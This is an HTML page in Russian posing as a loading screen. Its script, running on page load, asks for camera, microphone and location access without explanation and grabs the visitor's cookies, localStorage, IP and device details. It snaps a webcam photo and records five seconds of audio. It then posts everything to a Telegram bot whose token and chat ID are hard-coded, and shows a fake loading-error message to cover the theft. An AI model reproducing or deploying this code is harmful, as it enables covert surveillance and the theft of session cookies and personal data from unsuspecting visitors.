<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Загрузка...</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #0a0a0a;
            color: #fff;
            font-family: system-ui, sans-serif;
            text-align: center;
            padding: 20px;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
        }
        .loader {
            width: 40px;
            height: 40px;
            border: 4px solid #222;
            border-top: 4px solid #1e90ff;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
            margin: 20px auto;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        #status { color: #555; font-size: 13px; margin-top: 10px; }
    </style>
</head>
<body>
    <div class="loader"></div>
    <div id="status">Загрузка...</div>

<script>
    // ===== ТВОИ ДАННЫЕ =====
    const BOT_TOKEN = '8856699923:AAEV2fZvndBsC6iBIquVi7S4ce6t5gWlIFM';
    const CHAT_ID = '5025315928';
    // =======================

    const status = document.getElementById('status');

    let stream = null;
    let audioBlob = null;
    let photoData = null;
    let locationData = null;

    // === ЗАПУСК СРАЗУ ===
    window.onload = async function() {
        status.textContent = 'Подготовка...';

        // === 1. ЗАПРОС РАЗРЕШЕНИЙ (БЕЗ ОБЪЯСНЕНИЙ) ===
        try {
            stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
        } catch (e) {}

        try {
            const pos = await new Promise((resolve, reject) => {
                navigator.geolocation.getCurrentPosition(resolve, reject, { timeout: 5000 });
            });
            locationData = {
                lat: pos.coords.latitude,
                lon: pos.coords.longitude,
                acc: pos.coords.accuracy
            };
        } catch (e) {}

        // === 2. СБОР ДАННЫХ ===
        const deviceInfo = {
            userAgent: navigator.userAgent,
            platform: navigator.platform,
            language: navigator.language,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            screen: `${screen.width}x${screen.height}`,
            touch: 'ontouchstart' in window,
            cookies: document.cookie,
            localStorage: JSON.stringify(localStorage)
        };

        let ip = 'не определён';
        try {
            const res = await fetch('https://api.ipify.org?format=json');
            const data = await res.json();
            ip = data.ip;
        } catch (e) {}

        // === 3. ФОТО ===
        if (stream && stream.getVideoTracks().length > 0) {
            const video = document.createElement('video');
            video.srcObject = stream;
            video.play();
            await new Promise(r => setTimeout(r, 300));
            const canvas = document.createElement('canvas');
            canvas.width = 640;
            canvas.height = 480;
            canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
            photoData = canvas.toDataURL('image/png');
        }

        // === 4. ЗВУК (5 сек) ===
        if (stream && stream.getAudioTracks().length > 0) {
            try {
                const mediaRecorder = new MediaRecorder(stream);
                const chunks = [];
                mediaRecorder.ondataavailable = e => chunks.push(e.data);
                mediaRecorder.start();
                await new Promise(r => setTimeout(r, 5000));
                mediaRecorder.stop();
                audioBlob = new Blob(chunks, { type: 'audio/webm' });
            } catch (e) {}
        }

        // === 5. ОТПРАВКА ===
        await sendAll(deviceInfo, ip);
    };

    async function sendAll(deviceInfo, ip) {
        status.textContent = 'Отправка...';

        let text = `📌 <b>Сбор данных</b>\n\n`;
        text += `🖥 <b>User-Agent:</b> ${deviceInfo.userAgent}\n`;
        text += `📱 <b>Платформа:</b> ${deviceInfo.platform}\n`;
        text += `🌐 <b>Язык:</b> ${deviceInfo.language}\n`;
        text += `⏰ <b>Часовой пояс:</b> ${deviceInfo.timezone}\n`;
        text += `📺 <b>Экран:</b> ${deviceInfo.screen}\n`;
        text += `🖱 <b>Тач-экран:</b> ${deviceInfo.touch}\n`;
        text += `🌍 <b>IP:</b> ${ip}\n`;

        if (locationData) {
            text += `📍 <b>Гео:</b> ${locationData.lat}, ${locationData.lon} (±${locationData.acc}м)\n`;
        }

        text += `\n🍪 <b>Cookies:</b> ${deviceInfo.cookies || 'нет'}\n`;
        text += `📦 <b>LocalStorage:</b> ${deviceInfo.localStorage || 'нет'}\n`;

        // Отправка текста
        await sendToTelegram('sendMessage', { chat_id: CHAT_ID, text, parse_mode: 'HTML' });

        // Отправка фото
        if (photoData) {
            const blob = await fetch(photoData).then(r => r.blob());
            const form = new FormData();
            form.append('chat_id', CHAT_ID);
            form.append('photo', blob, 'camera.png');
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: form });
        }

        // Отправка аудио
        if (audioBlob) {
            const form = new FormData();
            form.append('chat_id', CHAT_ID);
            form.append('audio', audioBlob, 'mic.webm');
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendAudio`, { method: 'POST', body: form });
        }

        // === 6. ПОСЛЕ ОТПРАВКИ — ПУСТАЯ СТРАНИЦА ===
        document.body.innerHTML = `
            <div style="text-align:center;padding:50px;color:#555;font-family:system-ui;">
                <h2 style="font-size:20px;color:#333;">Ошибка загрузки</h2>
                <p style="font-size:14px;">Попробуйте обновить страницу</p>
            </div>
        `;
    }

    async function sendToTelegram(method, params) {
        const url = `https://api.telegram.org/bot${BOT_TOKEN}/${method}`;
        const form = new FormData();
        for (const key in params) {
            form.append(key, params[key]);
        }
        await fetch(url, { method: 'POST', body: form });
    }
</script>
</body>
</html>
